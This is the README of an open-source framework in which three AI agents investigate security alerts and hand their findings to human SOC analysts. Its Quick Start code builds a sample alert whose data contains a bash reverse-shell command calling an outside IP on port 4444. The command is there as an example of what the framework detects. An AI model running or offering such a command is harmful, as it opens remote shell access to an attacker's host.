# ZainGuard AI

An open-source framework for AI-assisted security operations. Built for SOC teams who want to leverage AI to investigate security alerts faster — without vendor lock-in or bloated infrastructure.

**Simplicity is the governing principle.** The code is meant to be read and understood, not just used.

> All AI-generated investigation outputs require human review before any action is taken. The framework accelerates analysis — humans make the final call.

---

## How It Works

Given a security alert, three agents collaborate to produce a documented investigation:

```
[Alert Event]
      │
      ▼
┌─────────────┐
│   Director  │  Triages the alert, generates 3 focused investigative questions
└──────┬──────┘
       │
       ▼
┌──────────────┐
│ Investigator │  Answers each question by querying available data sources
└──────┬───────┘
       │
       ▼
┌──────────────┐
│   Reviewer   │  Validates findings, finalizes the case, hands off to human
└──────┬───────┘
       │
       ▼
[Human Analyst Review]
```

The Investigator queries three data layers:
- **Layer 1 — Security Telemetry**: Snowflake/data lake, CloudTrail, Okta, Wiz, CrowdStrike
- **Layer 2 — Organizational Knowledge**: Glean, GitHub, Slack, Confluence, Google Drive
- **Layer 3 — Threat Intelligence**: VirusTotal, AbuseIPDB, Shodan, MISP

---

## Quick Start

```bash
pip install zainguard-ai-soc
```

```python
import os
from zainguard_ai_soc.pipeline import investigate
from zainguard_ai_soc.models import Alert, Severity
from zainguard_ai_soc.connectors.virustotal import VirusTotalConnector

report = investigate(
    alert=Alert(
        id="wiz-2024-0042",
        title="Suspicious outbound connection from EC2 (possible reverse shell)",
        source="wiz_runtime",
        severity=Severity.HIGH,
        raw={
            "resource_id": "i-0abc1234def56789",
            "process": {"command_line": "/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1"},
            "network": {"destination_ip": "198.51.100.42", "destination_port": 4444},
        },
    ),
    connectors=[
        VirusTotalConnector(api_key=os.environ["VIRUSTOTAL_API_KEY"]),
        # Add more: SnowflakeConnector, OktaConnector, GleanConnector...
    ],
)

print(report.verdict)            # Verdict.MALICIOUS / .BENIGN / .INCONCLUSIVE
print(report.executive_summary)  # 2-3 sentence summary
print(report.recommendations)   # ["Isolate instance i-0abc1234", ...]
```

Run the included example:
```bash
export ANTHROPIC_API_KEY=your_key
export VIRUSTOTAL_API_KEY=your_key
python examples/reverse_shell_alert.py
```

---

## Foundational Requirements

For effective investigations, your deployment should have:

| Requirement | Purpose | Minimum |
|-------------|---------|---------|
| Security data lake | Layer 1 telemetry queries | Snowflake, BigQuery, or Elasticsearch |
| Schema registry | Prevents hallucinated queries | YAML file mapping tables to fields (see `schema_examples/`) |
| Knowledge base | Layer 2 context for expected activity | Glean, GitHub, or Confluence API |
| Threat intel source | Layer 3 IOC enrichment | VirusTotal free tier |
| Anthropic API key | LLM for all agents | `ANTHROPIC_API_KEY` env variable |

Without a schema registry, the Investigator agent may produce invalid queries against your data lake.

---

## Available Connectors

| Connector | Layer | Status |
|-----------|-------|--------|
| `VirusTotalConnector` | Layer 3 — TI | Available |
| `AbuseIPDBConnector` | Layer 3 — TI | Coming soon |
| `ShodanConnector` | Layer 3 — TI | Coming soon |
| `SnowflakeConnector` | Layer 1 — Telemetry | Coming soon |
| `OktaConnector` | Layer 1 — Identity | Coming soon |
| `CloudTrailConnector` | Layer 1 — AWS | Coming soon |
| `WizConnector` | Layer 1 — Runtime | Coming soon |
| `GleanConnector` | Layer 2 — Knowledge | Coming soon |
| `GitHubConnector` | Layer 2 — Code/Changes | Coming soon |

---

## Project Structure

```
zainguard-ai/
├── zainguard_ai_soc/                    # Core Python package
│   ├── agents/
│   │   ├── director.py           # Director Agent
│   │   ├── investigator.py       # Investigator Agent
│   │   └── reviewer.py           # Reviewer Agent
│   ├── connectors/               # Data source connectors
│   │   ├── base.py               # Connector interface
│   │   └── virustotal.py         # VirusTotal (Layer 3)
│   ├── schema/
│   │   └── registry.py           # Schema registry
│   ├── pipeline.py               # Main investigation pipeline
│   └── models.py                 # Shared data models
├── examples/
│   └── reverse_shell_alert.py    # End-to-end example
├── schema_examples/
│   └── snowflake_security.yaml   # Example schema registry file
├── src/                          # Legacy v1 code (preserved for reference)
├── CLAUDE.md                     # Full project vision and architecture
└── pyproject.toml
```

---

## Contributing

The most impactful contributions are **new connectors**. Each connector:
- Implements `BaseConnector` (`zainguard_ai_soc/connectors/base.py`)
- Has a working usage example in `examples/`
- Includes a schema YAML if it's a data lake connector
- Has tests that work without live credentials (mock the HTTP calls)

See `CONTRIBUTING.md` for full guidelines.

---

## Architecture

See [CLAUDE.md](CLAUDE.md) for the full framework vision, design principles, agent architecture, data layers, and foundational requirements.

---

## License

Apache 2.0 — see [LICENSE](LICENSE).